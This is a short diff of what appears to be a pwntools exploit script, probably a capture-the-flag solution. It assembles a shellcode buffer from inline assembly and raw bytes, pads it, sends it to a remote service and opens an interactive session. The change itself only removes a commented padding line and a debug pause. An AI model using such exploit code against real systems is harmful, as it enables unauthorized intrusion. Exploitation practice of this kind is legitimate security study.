@@ -197,7 +197,6 @@ buf += asm('''
  add cl, byte PTR [rdx+rax*1]
  ''')
 
-#buf += "\x00"*(0x200-len(buf))
 buf += "\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05"
 
 buf += "\x00"*(0x2df-len(buf))
@@ -210,7 +209,6 @@ buf += "\x00"*(0x30f+0x2f-len(buf))
 buf += "\x00\x02"  # rcx = 0x200
 
 buf += "\x00"*(1000-len(buf))
-pause()
 s.sendline(buf)
 
 s.interactive()
